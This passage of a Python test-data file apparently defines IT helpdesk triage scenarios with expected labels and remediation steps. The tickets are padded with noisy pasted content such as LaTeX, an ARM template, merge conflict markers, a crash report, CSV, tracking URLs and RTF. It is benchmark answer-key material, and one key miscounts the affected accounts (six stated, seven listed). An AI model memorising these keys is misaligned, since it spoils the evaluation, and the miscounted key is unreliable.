                "$$\\Gamma = \\frac{\\partial^2 C}{\\partial S^2} = "
                "\\frac{N'(d_1)}{S_0 \\sigma \\sqrt{T}}$$\n\n"
                "Where $N'(x) = \\frac{1}{\\sqrt{2\\pi}} e^{-x^2/2}$ is the "
                "standard normal PDF.\n\n"
                "The specific test case where I see the error:\n"
                "- Spot price $S_0 = 150$, Strike $K = 100$, "
                "Risk-free rate $r = 0.05$\n"
                "- Volatility $\\sigma = 0.20$, Time to expiry $T = 0.5$ years\n"
                "- Expected Delta: 0.9782, ContosoCalc returns: 0.8431\n"
                "- Expected Gamma: 0.0045, ContosoCalc returns: 0.0312\n\n"
                "The error seems to be in the $d_1$ calculation — I suspect the "
                "library is using $\\sigma$ instead of $\\sigma^2/2$ in the drift "
                "term, which would be a classic implementation bug:\n"
                "$$d_1^{\\text{buggy}} = \\frac{\\ln(S_0/K) + (r + \\sigma)T}"
                "{\\sigma\\sqrt{T}} \\neq d_1^{\\text{correct}}$$\n\n"
                "This was introduced in v8.3.1 — version 8.3.0 was correct. Can the "
                "quantitative development team investigate?\n\n"
                "Natalie Zhao\nQuantitative Analyst\nDerivatives Pricing\n"
                "Floor 12, Quant Lab"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P3,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[
                MissingInfo.APPLICATION_VERSION,
                MissingInfo.STEPS_TO_REPRODUCE,
            ],
            next_best_action=(
                "Look past the LaTeX/math notation ($$, \\frac, \\sigma, \\partial, "
                "etc.) — these are formula references, not part of the bug itself. "
                "The reporter has identified a likely regression in ContosoCalc v8.3.1 "
                "where the Black-Scholes d1 drift term uses sigma instead of sigma^2/2. "
                "Escalate to the quantitative development team with the specific test "
                "case (S=150, K=100, r=0.05, sigma=0.20, T=0.5) and the version "
                "comparison (v8.3.0 correct vs v8.3.1 incorrect)."
            ),
            remediation_steps=[
                "File a high-priority defect with the ContosoCalc quantitative "
                "development team referencing the d1 drift-term regression in v8.3.1.",
                "Provide the test case inputs (S=150, K=100, r=0.05, sigma=0.20, "
                "T=0.5) and expected vs actual Delta/Gamma values for reproduction.",
                "Diff the d1 calculation code between ContosoCalc v8.3.0 and v8.3.1 "
                "to confirm the sigma vs sigma^2/2 hypothesis.",
                "Roll back affected production systems to ContosoCalc v8.3.0 until "
                "the fix is verified, as incorrect Greeks pose financial risk.",
                "After the fix, run the full Greeks validation test suite (including "
                "deep ITM, ATM, and deep OTM cases) before re-releasing.",
            ],
            reporter_name="Natalie Zhao",
            reporter_email="natalie.zhao@contoso.com",
            reporter_department="Derivatives Pricing",
            channel=Channel.PORTAL,
            tags=[
                "data-cleanup",
                "latex-notation",
                "math-formulas",
            ],
            difficulty="hard",
        ),
        # ── DC-118  ARM template / Bicep JSON config dump ─────────────────────
        ScenarioDefinition(
            scenario_id="DC-118",
            subject="Azure deployment failed for ContosoPayments staging — ARM template attached",
            description=(
                "Our staging deployment for the ContosoPayments service failed at "
                "2:30 AM during the automated release pipeline. The Azure Resource "
                "Manager returned a 'ResourceDeploymentFailure' error. I'm pasting "
                "the relevant section of our ARM template so you can see the config:\n\n"
                "{\n"
                '  "$schema": "https://schema.management.azure.com/schemas/'
                '2019-04-01/deploymentTemplate.json#",\n'
                '  "contentVersion": "1.0.0.0",\n'
                '  "parameters": {\n'
                '    "appServicePlanSku": {\n'
                '      "type": "string",\n'
                '      "defaultValue": "P2v3",\n'
                '      "allowedValues": ["P1v3", "P2v3", "P3v3"]\n'
                "    },\n"
                '    "sqlServerAdminPassword": {\n'
                '      "type": "securestring",\n'
                '      "metadata": {\n'
                '        "description": "SQL admin password from Key Vault"\n'
                "      }\n"
                "    }\n"
                "  },\n"
                '  "resources": [\n'
                "    {\n"
                '      "type": "Microsoft.Web/serverfarms",\n'
                '      "apiVersion": "2022-03-01",\n'
                '      "name": "asp-contosopay-staging",\n'
                '      "location": "[resourceGroup().location]",\n'
                '      "sku": {\n'
                '        "name": "[parameters(\'appServicePlanSku\')]",\n'
                '        "capacity": 3\n'
                "      }\n"
                "    },\n"
                "    {\n"
                '      "type": "Microsoft.Web/sites",\n'
                '      "apiVersion": "2022-03-01",\n'
                '      "name": "app-contosopay-staging",\n'
                '      "location": "[resourceGroup().location]",\n'
                '      "dependsOn": [\n'
                "        \"[resourceId('Microsoft.Web/serverfarms', "
                "'asp-contosopay-staging')]\"\n"
                "      ],\n"
                '      "properties": {\n'
                '        "serverFarmId": "[resourceId(\'Microsoft.Web/serverfarms\', '
                "'asp-contosopay-staging')]\",\n"
                '        "siteConfig": {\n'
                '          "alwaysOn": true,\n'
                '          "linuxFxVersion": "DOTNETCORE|8.0",\n'
                '          "appSettings": [\n'
                "            {\n"
                '              "name": "APPINSIGHTS_INSTRUMENTATIONKEY",\n'
                '              "value": "[reference(resourceId(\'Microsoft.Insights/'
                "components', 'ai-contosopay-staging')).InstrumentationKey]\"\n"
                "            },\n"
                "            {\n"
                '              "name": "ConnectionStrings__PaymentDb",\n'
                '              "value": "[concat(\'Server=tcp:\', reference(resourceId('
                "'Microsoft.Sql/servers', 'sql-contosopay-staging')).fullyQualified"
                "DomainName, ',1433;Database=PaymentDb;')]}\"\n"
                "            }\n"
                "          ]\n"
                "        }\n"
                "      }\n"
                "    }\n"
                "  ]\n"
                "}\n\n"
                "The actual error message from the deployment log is:\n"
                "\"Code: ResourceNotFound, Message: The Resource 'Microsoft.Insights/"
                "components/ai-contosopay-staging' under resource group "
                "'rg-contosopay-staging' was not found.\"\n\n"
                "It seems like the Application Insights resource doesn't exist yet in "
                "staging. We just created this new staging resource group last week and "
                "I think we missed adding the App Insights resource to the template.\n\n"
                "Can someone help us add the missing resource and re-run the deployment? "
                "We need staging up for UAT testing that starts Monday.\n\n"
                "James Okoro\nDevOps Engineer\nPayments Platform Team\n"
                "Remote — Toronto Office"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[
                MissingInfo.CONFIGURATION_DETAILS,
                MissingInfo.ENVIRONMENT_DETAILS,
            ],
            next_best_action=(
                "Ignore the bulk of the ARM template JSON (schema, parameters, "
                "resource definitions, dependsOn chains, app settings). The actual "
                "error is clear: the Application Insights resource "
                "'ai-contosopay-staging' is missing from resource group "
                "'rg-contosopay-staging'. The ARM template references it but does "
                "not define it. Add a Microsoft.Insights/components resource to the "
                "template and re-run the deployment."
            ),
            remediation_steps=[
                "Add a Microsoft.Insights/components resource definition for "
                "'ai-contosopay-staging' to the ARM template with the correct "
                "location and workspace configuration.",
                "Add the App Insights resource to the dependsOn array of the "
                "Microsoft.Web/sites resource so it deploys in the correct order.",
                "Validate the updated ARM template using 'az deployment group "
                "validate' before re-deploying to catch any other missing references.",
                "Re-run the deployment pipeline targeting the rg-contosopay-staging "
                "resource group and verify all resources provision successfully.",
                "Review the template against the production ARM template to identify "
                "any other resources that may have been missed when setting up the "
                "new staging environment.",
                "Add a CI validation step to the pipeline that runs 'what-if' "
                "deployment checks to catch missing resources before actual deploys.",
            ],
            reporter_name="James Okoro",
            reporter_email="james.okoro@contoso.com",
            reporter_department="Payments Platform Team",
            channel=Channel.PORTAL,
            tags=[
                "data-cleanup",
                "arm-template",
                "json-config-dump",
            ],
            difficulty="medium",
        ),
        # ── DC-119  Git merge conflict markers in pasted code ─────────────────
        ScenarioDefinition(
            scenario_id="DC-119",
            subject="Build pipeline broken — config file has merge issues after branch merge",
            description=(
                "Hi team,\n\n"
                "Our CI/CD build pipeline (Azure DevOps, contoso-tradeledger repo) "
                "has been failing since this morning. I merged the feature/settlement-"
                "batch branch into main at 7:40 AM and the build broke immediately. "
                "The error says 'Invalid YAML' in the pipeline config.\n\n"
                "I looked at the config file and found the problem — there are merge "
                "conflicts that didn't get resolved. Here's what the file looks like "
                "right now:\n\n"
                "# contoso-tradeledger pipeline config\n"
                "service:\n"
                "  name: trade-ledger-service\n"
                "  version: 4.12.0\n\n"
                "database:\n"
                "<<<<<<< HEAD\n"
                "  host: sql-tradeledger-prod.database.windows.net\n"
                "  port: 1433\n"
                "  name: TradeLedgerDB\n"
                "  pool_size: 25\n"
                "  timeout: 30\n"
                "=======\n"
                "  host: sql-tradeledger-prod-v2.database.windows.net\n"
                "  port: 1433\n"
                "  name: TradeLedgerDB_v2\n"
                "  pool_size: 50\n"
                "  timeout: 60\n"
                "  retry_count: 3\n"
                "  retry_delay: 5\n"
                ">>>>>>> feature/settlement-batch\n\n"
                "batch_processing:\n"
                "<<<<<<< HEAD\n"
                "  enabled: false\n"
                "  batch_size: 100\n"
                "=======\n"
                "  enabled: true\n"
                "  batch_size: 500\n"
                "  parallel_workers: 4\n"
                "  checkpoint_interval: 60\n"
                ">>>>>>> feature/settlement-batch\n\n"
                "logging:\n"
                "  level: INFO\n"
                "  output: /var/log/tradeledger/app.log\n\n"
                "I'm not sure which version of the database config is correct — the "
                "old one pointing to sql-tradeledger-prod or the new one pointing to "
                "sql-tradeledger-prod-v2. The feature branch was supposed to migrate "
                "us to the new database with larger pool sizes for batch settlement.\n\n"
                "The build has been red for 3 hours now and the team can't merge any "
                "other PRs. Can someone help us resolve this properly?\n\n"
                "Tomás Rivera\nSoftware Developer\nTrade Ledger Engineering\n"
                "Austin Office, Bldg 2"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P3,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[
                MissingInfo.CONFIGURATION_DETAILS,
                MissingInfo.AFFECTED_SYSTEM,
            ],
            next_best_action=(
                "Recognize that the <<<<<<< HEAD, =======, and >>>>>>> markers are "
                "unresolved Git merge conflict artifacts, not valid YAML. The pipeline "
                "config file needs these conflicts manually resolved. Coordinate with "
                "the developer and the settlement-batch feature owner to determine the "
                "correct database host and batch_processing settings, then commit the "
                "resolved file to unblock the CI/CD pipeline."
            ),
            remediation_steps=[
                "Identify the correct database configuration by consulting the "
                "settlement-batch feature owner — determine whether the migration "
                "to sql-tradeledger-prod-v2 and TradeLedgerDB_v2 is ready for "
                "production.",
                "Remove all Git merge conflict markers (<<<<<<< HEAD, =======, "
                ">>>>>>> feature/settlement-batch) from the pipeline config file.",
                "Resolve the batch_processing section — if the feature is ready, "
                "accept the feature branch values (enabled: true, batch_size: 500, "
                "parallel_workers: 4).",
                "Commit the resolved config file, push to main, and verify the "
                "CI/CD pipeline passes the YAML validation stage.",
                "Set up branch protection rules requiring successful builds before "
                "merge to prevent unresolved conflicts from reaching main in the "
                "future.",
            ],
            reporter_name="Tomás Rivera",
            reporter_email="tomas.rivera@contoso.com",
            reporter_department="Trade Ledger Engineering",
            channel=Channel.CHAT,
            tags=[
                "data-cleanup",
                "merge-conflict-markers",
                "git-artifacts",
            ],
            difficulty="easy",
        ),
        # ── DC-120  macOS crash report (CrashReporter format) ─────────────────
        ScenarioDefinition(
            scenario_id="DC-120",
            subject="ContosoAnalytics Mac app crashes on launch after macOS Sonoma update",
            description=(
                "Hi IT Support,\n\n"
                "Ever since I updated my MacBook Pro (M3 Pro, 16-inch, 2023) to "
                "macOS Sonoma 14.4 yesterday, the ContosoAnalytics desktop app "
                "(v6.1.0) crashes immediately on launch. I can see the dock icon "
                "bounce once and then it disappears. I've tried reinstalling the "
                "app, clearing the preferences (~/Library/Preferences/"
                "com.contoso.analytics.plist), and even creating a new user profile "
                "— same crash every time.\n\n"
                "Here is the crash report from Console.app:\n\n"
                "Process:               ContosoAnalytics [1842]\n"
                "Path:                  /Applications/ContosoAnalytics.app/Contents/"
                "MacOS/ContosoAnalytics\n"
                "Identifier:            com.contoso.analytics\n"
                "Version:               6.1.0 (6100)\n"
                "Code Type:             ARM-64 (Native)\n"
                "Parent Process:        launchd [1]\n"
                "Responsible:           ContosoAnalytics [1842]\n\n"
                "Date/Time:             2024-03-15 09:14:22.431 +0000\n"
                "OS Version:            macOS 14.4 (23E214)\n"
                "Report Version:        12\n"
                "Anonymous UUID:        8A3F1B2C-4D5E-6F7A-8B9C-0D1E2F3A4B5C\n\n"
                "Exception Type:        EXC_CRASH (SIGABRT)\n"
                "Exception Codes:       0x0000000000000000, 0x0000000000000000\n"
                "Termination Reason:    Namespace DYLD, Code 1 Library missing\n"
                "Termination Description: Library not loaded: "
                "@rpath/libssl.3.dylib\n"
                "  Referenced from: /Applications/ContosoAnalytics.app/Contents/"
                "Frameworks/ContosoNetworking.framework/ContosoNetworking\n"
                "  Reason: tried: '/usr/lib/libssl.3.dylib' (no such file), "
                "'/opt/homebrew/lib/libssl.3.dylib' (no such file, not in dyld "
                "cache)\n\n"
                "Thread 0 Crashed:: Dispatch queue: com.apple.main-thread\n"
                "0   dyld                  0x000000018b2f1a3c "
                "dyld4::halt(char const*) + 572\n"
                "1   dyld                  0x000000018b2f5e20 "
                "dyld4::prepare(dyld4::APIs&, dyld3::MachOAnalyzer const*) + 3740\n"
                "2   dyld                  0x000000018b2e9a5c "
                "_dyld_start + 5765\n\n"
                "Thread 0 crashed with ARM Thread State (64-bit):\n"
                "    x0: 0x0000000000000006   x1: 0x000000016b4e2b18   "
                "x2: 0x0000000000000000\n"
                "    x3: 0x000000016b4e27a0   x4: 0x000000016b4e2048   "
                "x5: 0x000000000000002d\n"
                "    x6: 0x0000000000000069   x7: 0x0000000000000900\n"
                "   pc: 0x000000018b2f1a3c  cpsr: 0x40001000\n\n"
                "Binary Images:\n"
                "       0x1009e8000 -        0x100c7bfff  com.contoso.analytics "
                "(6.1.0) <A1B2C3D4-E5F6-7890-ABCD-EF1234567890> "
                "/Applications/ContosoAnalytics.app/Contents/MacOS/"
                "ContosoAnalytics\n"
                "       0x18b2dc000 -        0x18b31efff  dyld (*) "
                "<B2C3D4E5-F6A7-890B-CDEF-234567890ABC> /usr/lib/dyld\n\n"
                "I need this app for my quarterly portfolio analysis which is due "
                "this Friday. About 15 analysts in my group use this app and I "
                "expect they will hit the same issue once they update to Sonoma 14.4.\n\n"
                "Samantha Reeves\nPortfolio Analyst\nAsset Management\n"
                "San Francisco Office, Floor 5"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.APPLICATION_VERSION, MissingInfo.DEVICE_INFO],
            next_best_action=(
                "Look past the crash report noise (thread state registers, binary "
                "image addresses, UUIDs, exception codes). The key line is "
                "'Termination Reason: Namespace DYLD, Code 1 Library missing' — "
                "ContosoAnalytics bundles a ContosoNetworking framework that depends "
                "on libssl.3.dylib, which is no longer available at the expected "
                "paths in macOS Sonoma 14.4. The app needs to be rebuilt to bundle "
                "its own OpenSSL library or link against the macOS-native Security "
                "framework."
            ),
            remediation_steps=[
                "Confirm the root cause by checking whether macOS Sonoma 14.4 "
                "removed or relocated libssl.3.dylib — Apple has been deprecating "
                "bundled OpenSSL since macOS 10.7.",
                "As an immediate workaround, install OpenSSL 3.x via Homebrew "
                "('brew install openssl@3') and create a symlink or set "
                "DYLD_LIBRARY_PATH to point to the Homebrew OpenSSL lib directory.",
                "File a defect with the ContosoAnalytics development team to bundle "
                "libssl.3.dylib inside the app's Frameworks directory or migrate "
                "ContosoNetworking to Apple's native Security/Network frameworks.",
                "Send a communication to the 15 Asset Management analysts advising "
                "them to delay the macOS Sonoma 14.4 update until the fix is ready.",
                "Request an expedited patch release (v6.1.1) that bundles the "
                "required OpenSSL libraries before the Friday quarterly analysis "
                "deadline.",
            ],
            reporter_name="Samantha Reeves",
            reporter_email="samantha.reeves@contoso.com",
            reporter_department="Asset Management",
            channel=Channel.PORTAL,
            tags=[
                "data-cleanup",
                "macos-crash-report",
                "crash-reporter",
            ],
            difficulty="medium",
        ),
        # ── DC-121  CSV spreadsheet data pasted inline ───────────────
        ScenarioDefinition(
            scenario_id="DC-121",
            subject="User access provisioning issue — see affected users list below",
            description=(
                "Hi IAM team,\n\n"
                "We need to review access for the following employees. Several of them "
                "report they cannot reach the Contoso Trade Portal since the last AD "
                "sync. I exported the data from our tracking spreadsheet:\n\n"
                "EmployeeID,Name,Department,Role,AccessLevel,LastLogin,Status\n"
                "E10421,Maria Chen,Trading,Senior Trader,Level3,2026-03-14,Active\n"
                "E10422,James O'Brien,Trading,Analyst,Level2,2026-03-10,Locked\n"
                "E10423,Priya Kapoor,Risk Management,Manager,Level3,2026-03-15,Active\n"
                "E10424,Robert Kim,Compliance,Analyst,Level2,2026-02-28,Expired\n"
                "E10425,Sofia Vargas,Wealth Management,VP,Level4,2026-03-14,Active\n"
                "E10426,Daniel Nakamura,Trading,Quant,Level3,2026-03-01,Locked\n"
                "E10427,Emily Watson,Finance,Controller,Level2,2026-03-12,Active\n"
                "E10428,Ahmed Hassan,Data Engineering,Engineer,Level2,2026-03-13,Active\n"
                "E10429,Lisa Park,Compliance,Senior Analyst,Level3,2026-03-11,Locked\n"
                "E10430,Michael Torres,Trading,Director,Level4,2026-03-15,Active\n"
                "E10431,Rachel Green,HR,Business Partner,Level2,2026-03-09,Active\n"
                "E10432,Kevin Liu,Engineering,Staff Eng,Level3,2026-03-14,Active\n"
                "E10433,Anna Schmidt,Regulatory Affairs,Analyst,Level2,2026-03-08,Expired\n"
                "E10434,Carlos Mendez,Settlements,Processor,Level1,2026-03-13,Locked\n"
                "E10435,Olivia Brown,Portfolio Mgmt,PM,Level3,2026-03-14,Active\n"
                "E10436,David Ng,IT Security,Architect,Level4,2026-03-15,Active\n"
                "E10437,Sarah Johnson,Legal,Counsel,Level3,2026-03-12,Active\n"
                "E10438,Thomas Wright,Fixed Income,Trader,Level3,2026-03-07,Locked\n"
                "E10439,Jessica Lee,Derivatives,Analyst,Level2,2026-03-14,Active\n"
                "E10440,Mark Davis,Middle Office,Ops Analyst,Level1,2026-03-10,Expired\n\n"
                "The ones showing 'Locked' or 'Expired' are the affected users. They "
                "all say they get 'Access Denied — contact your administrator' when "
                "trying to log in. This started after the AD sync on March 10.\n\n"
                "Can you investigate and unlock/reprovision the affected accounts?\n\n"
                "Thanks,\nAnna Kowalski\nIT Operations"
            ),
            category=Category.ACCESS_AUTH,
            priority=Priority.P3,
            team=Team.IAM,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE, MissingInfo.AUTHENTICATION_METHOD],
            next_best_action=(
                "Extract the affected users from the CSV data (those with 'Locked' "
                "or 'Expired' status) and investigate why AD sync on March 10 caused "
                "account lockouts. Ignore the CSV noise and focus on the AD sync issue."
            ),
            remediation_steps=[
                "Identify the 6 affected accounts (E10422, E10424, E10426, E10429, E10434, E10438, E10440) "
                "from the CSV data.",
                "Check Active Directory sync logs for March 10 to identify what triggered the lockouts.",
                "Verify the accounts' status in Azure AD and on-prem AD for any sync discrepancies.",
                "Unlock the locked accounts and reset the expired accounts per standard procedure.",
                "Verify the Contoso Trade Portal access is restored for all affected users.",
            ],
            reporter_name="Anna Kowalski",
            reporter_email="anna.kowalski@contoso.com",
            reporter_department="IT Operations",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "csv-data-inline", "tabular-noise"],
            difficulty="medium",
        ),
        # ── DC-122  Extremely long tracking URLs ─────────────────────
        ScenarioDefinition(
            scenario_id="DC-122",
            subject="SharePoint links broken after migration — URLs not working",
            description=(
                "Hi Data Platform team,\n\n"
                "Since the SharePoint site migration last weekend, several document "
                "links are returning 404 errors. Here are the URLs that are broken:\n\n"
                "1. https://contoso.sharepoint.com/sites/WealthMgmt/Shared%20Documents/"
                "Forms/AllItems.aspx?id=%2Fsites%2FWealthMgmt%2FShared%20Documents%2F"
                "Client%20Reports%2FQ1-2026&viewid=a8f3b2c1-4d5e-6f7a-8b9c-0d1e2f3a4b5c"
                "&utm_source=email_notification&utm_medium=internal&utm_campaign="
                "weekly_digest_2026_03_15&utm_content=document_link&utm_term=client_reports"
                "&fbclid=IwAR3xYz1AbCdEfGhIjKlMnOpQrStUvWxYz&ref=email_weekly&"
                "tracking_id=TRK-2026-03-15-WM-001-abcdef1234567890abcdef1234567890&"
                "session=s_1710500400_abcdef&click_id=CK-98765432109876543210&"
                "source_campaign_id=SCI-WM-Q1-2026-WEEKLY-DIGEST\n\n"
                "2. https://contoso.sharepoint.com/sites/Compliance/Shared%20Documents/"
                "Regulatory%20Filings/2026/Q1-Submissions?csf=1&web=1&e=Ab3Cd4&"
                "CID=12345678-abcd-efgh-ijkl-123456789012&utm_source=teams_notification"
                "&utm_medium=internal_chat&utm_campaign=compliance_alerts_2026_03&"
                "utm_content=filing_deadline&tracking_id=TRK-2026-03-15-COMP-002-"
                "ghijkl5678901234ghijkl5678901234&ref=teams_bot&click_id="
                "CK-12345678901234567890&source_campaign_id=SCI-COMP-Q1-2026-ALERTS"
                "&redirect_count=3&original_url=https%3A%2F%2Fcontoso-old.sharepoint"
                ".com%2Fsites%2FCompliance%2FRegulatory\n\n"
                "3. https://contoso.sharepoint.com/sites/Trading/Shared%20Documents/"
                "Market%20Analysis?sortField=Modified&isAscending=false&viewid="
                "b1c2d3e4-f5a6-b7c8-d9e0-f1a2b3c4d5e6&utm_source=sharepoint_alert"
                "&utm_medium=email&utm_campaign=sp_migration_notification_2026_03_15"
                "&tracking_id=TRK-2026-03-15-TRAD-003-mnopqr7890123456mnopqr7890123456"
                "&ms_ref=SPMigration2026Q1Batch3&engagement_score=0.85\n\n"
                "All three used to work before the migration. The old URLs still show "
                "in saved bookmarks and Teams tabs. We need these fixed ASAP — the "
                "compliance filing deadlines are next week.\n\n"
                "Regards,\nVictor Petrov\nCompliance"
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P3,
            team=Team.DATA_PLATFORM,
            needs_escalation=False,
            missing_info=[MissingInfo.ENVIRONMENT_DETAILS],
            next_best_action=(
                "Investigate broken SharePoint document library links after the site "
                "migration. Ignore the tracking URL parameters — the core issue is "
                "404 errors on three SharePoint document libraries that were migrated."
            ),
            remediation_steps=[
                "Strip the tracking parameters from the URLs and verify the base SharePoint paths.",
                "Check the SharePoint migration logs for the three affected site collections "
                "(WealthMgmt, Compliance, Trading).",
                "Verify URL redirect mappings were created during migration for old-to-new paths.",
                "Create or fix the redirect mappings for the broken document library URLs.",
                "Update saved bookmarks and Teams tabs with the new URLs.",
            ],
            reporter_name="Victor Petrov",
            reporter_email="victor.petrov@contoso.com",
            reporter_department="Compliance",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "long-urls", "tracking-parameters"],
            difficulty="medium",
        ),
        # ── DC-123  RTF / Word document conversion artifacts ─────────
        ScenarioDefinition(
            scenario_id="DC-123",
            subject="Printer driver issue — error when printing from Word",
            description=(
                r"{\rtf1\ansi\ansicpg1252\deff0\nouicompat\deflang1033"
                r"{\fonttbl{\f0\fswiss\fprq2\fcharset0 Calibri;}}"
                r"{\colortbl ;\red0\green0\blue0;\red0\green0\blue255;}"
                r"{\*\generator Riched20 10.0.22621}"
                r"\viewkind4\uc1 "
                r"\pard\widctlpar\sa200\sl276\slmult1\f0\fs22\lang9 "
                "Hi IT Support,\\par\n"
                "\\par\n"
                r"I\rquote m having a problem with my printer. Every time I try to "
                "print a document from Microsoft Word, the print job fails with "
                r"the error \b\i Error 0x00000709 - Operation could not be completed"
                r"\b0\i0 .\\par"
                "\n\\par\n"
                r"The printer is an HP Color LaserJet Pro MFP M479fdw on Floor 4, "
                r"near the trading desks. It\rquote s connected via the network "
                r"(IP: 10.20.4.115). Printing works fine from Notepad and Chrome "
                r"\endash  it\rquote s only Word that fails.\\par"
                "\n\\par\n"
                r"I\rquote ve tried:\\par"
                r"\pard{\pntext\f0 1.\tab}"
                r"{\*\pn\pnlvlbody\pnf0\pnindent0\pnstart1\pndec"
                r"{\pntxta.}}\widctlpar\fi-360\li720\sa200\sl276\slmult1 "
                r"Removing and re-adding the printer\\par"
                r"{\pntext\f0 2.\tab}Updating the driver from HP\rquote s website\\par"
                r"{\pntext\f0 3.\tab}Running the Print Troubleshooter\\par"
                r"{\pntext\f0 4.\tab}Clearing the print spooler\\par"
                r"\pard\widctlpar\sa200\sl276\slmult1 None of these helped.\\par"
                "\n\\par\n"
                r"My laptop is a Lenovo ThinkPad X1 Carbon Gen 11 running Windows 11 "
                r"23H2. Word version is 16.0.17328.20162.\\par"
                "\n\\par\n"
                r"Thanks,\\par"
                r"Kevin Wu\\par"
                r"Trading Floor 4\\par}"
            ),
            category=Category.HARDWARE,
            priority=Priority.P3,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.STEPS_TO_REPRODUCE],
            next_best_action=(
                "Ignore the RTF formatting artifacts and extract the core issue: "
                "HP Color LaserJet Pro M479fdw fails to print from Word with error "
                "0x00000709. Printing works from other applications."
            ),
            remediation_steps=[
                "Investigate error 0x00000709 — this typically indicates the default printer "
                "registry key is corrupted or the print driver is incompatible with Word.",
                "Check the Windows registry key HKCU\\Software\\Microsoft\\Windows NT\\"
                "CurrentVersion\\Windows for a corrupted 'Device' value.",
                "Reset the default printer setting and verify the HP driver version matches the printer firmware.",
                "If the Word-specific issue persists, repair the Office installation via "
                "Settings > Apps > Microsoft 365 > Modify > Online Repair.",
                "Test printing from Word after each step to confirm resolution.",
            ],
            reporter_name="Kevin Wu",
            reporter_email="kevin.wu@contoso.com",
            reporter_department="Trading",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "rtf-conversion", "document-artifacts"],
            difficulty="medium",
        ),
        # ── DC-124  Chained auto-reply / out-of-office messages ──────
        ScenarioDefinition(
            scenario_id="DC-124",
            subject="RE: Automatic reply: RE: Automatic reply: RE: Teams audio issue",
            description=(
                "--- Automatic Reply ---\n"
                "From: itsupport-noreply@contoso.com\n"
                "Subject: Ticket Received — INC-PENDING\n"
                "Thank you for contacting IT Support. Your request has been received "
                "and will be reviewed within 4 business hours. If this is urgent, "
                "please call the Service Desk at x4357.\n\n"
                "--- Automatic Reply ---\n"
                "From: rajesh.gupta@contoso.com\n"
                "Subject: Out of Office\n"
                "Thank you for your email. I am out of the office from March 12–19 "
                "with limited access to email. For urgent IT issues, please contact "
                "the Service Desk. For project-related inquiries, please reach out to "
                "my backup, Anita Sharma (anita.sharma@contoso.com). I will respond "
                "to your email upon my return.\n\n"
                "--- Automatic Reply ---\n"
                "From: mailer-daemon@contoso.com\n"
                "Subject: Delivery Status Notification (Relay)\n"
                "This is an automatically generated message. Your message was "
                "successfully relayed to the following recipients:\n"
                "  itsupport@contoso.com (delivered to mailbox)\n"
                "  rajesh.gupta@contoso.com (delivered to mailbox)\n\n"
                "--- Read Receipt ---\n"
                "From: itsupport@contoso.com\n"
                "Subject: Read: Teams audio issue\n"
                "Your message 'Teams audio issue' was read on 3/15/2026 at 10:42 AM.\n\n"
                "--- Automatic Reply ---\n"
                "From: compliance-audit@contoso.com\n"
                "Subject: Email Retention Notice\n"
                "This email has been archived per Contoso retention policy CP-2026-04. "
                "Retention period: 7 years. Classification: Internal.\n\n"
                "--- Original Message ---\n"
                "From: Diana Morales <diana.morales@contoso.com>\n"
                "To: IT Support <itsupport@contoso.com>\n"
                "Subject: Teams audio issue\n\n"
                "Hi team,\n\n"
                "My Teams audio has been cutting out during calls for the last two days. "
                "The other participants can hear me for about 30 seconds, then my audio "
                "drops and they hear nothing until I toggle my mic off and on. Video "
                "continues to work fine. I am using a Jabra Evolve2 75 headset connected "
                "via Bluetooth. I'm on Teams version 24004.1309.2689.2246 on Windows 11.\n\n"
                "This is affecting my client calls — I had to switch to my phone twice "
                "today.\n\n"
                "Thanks,\nDiana Morales\nWealth Management"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P3,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.DEVICE_INFO, MissingInfo.REPRODUCTION_FREQUENCY],
            next_best_action=(
                "Skip past the 5 auto-reply/notification messages and focus on the "
                "original issue: Teams audio drops after ~30 seconds during calls. "
                "User is on a Jabra Evolve2 75 headset via Bluetooth."
            ),
            remediation_steps=[
                "Check for known issues with Jabra Evolve2 75 Bluetooth audio dropouts in Teams.",
                "Update the Jabra headset firmware via Jabra Direct and update the Bluetooth driver.",
                "Test with the headset connected via USB dongle instead of Bluetooth to isolate "
                "the connection method as the cause.",
                "Check Teams audio device settings and ensure the Jabra headset is selected as "
                "the default device (not switching mid-call).",
                "If Bluetooth is the root cause, update the laptop's Bluetooth driver and check "
                "for interference from other Bluetooth devices.",
            ],
            reporter_name="Diana Morales",
            reporter_email="diana.morales@contoso.com",
            reporter_department="Wealth Management",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "auto-reply-chain", "ooo-noise"],
            difficulty="medium",
        ),
        # ── DC-125  Large inline SVG image data ──────────────────────
        ScenarioDefinition(
            scenario_id="DC-125",
            subject="Intermittent network drops on Floor 7 — topology diagram attached inline",
            description=(
                "Hi Network Ops,\n\n"
                "We are experiencing intermittent connectivity drops on Floor 7, "
                "Building 2 in the New York office. About 15 users are affected. "
                "I drew a diagram of our floor layout showing the affected areas:\n\n"
                '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 600">\n'
                '  <rect x="0" y="0" width="800" height="600" fill="#f5f5f5" '
                'stroke="#333" stroke-width="2"/>\n'
                '  <text x="400" y="30" text-anchor="middle" font-size="16" '
                'font-weight="bold">Floor 7 - Building 2 - Network Layout</text>\n'
                '  <rect x="50" y="50" width="200" height="150" fill="#e8f5e9" '
                'stroke="#4caf50" stroke-width="1"/>\n'
                '  <text x="150" y="80" text-anchor="middle" font-size="12">'
                "Trading Desk A (OK)</text>\n"
                '  <rect x="300" y="50" width="200" height="150" fill="#ffebee" '
                'stroke="#f44336" stroke-width="2"/>\n'
                '  <text x="400" y="80" text-anchor="middle" font-size="12" '
                'fill="#f44336">Trading Desk B (AFFECTED)</text>\n'
                '  <rect x="550" y="50" width="200" height="150" fill="#ffebee" '
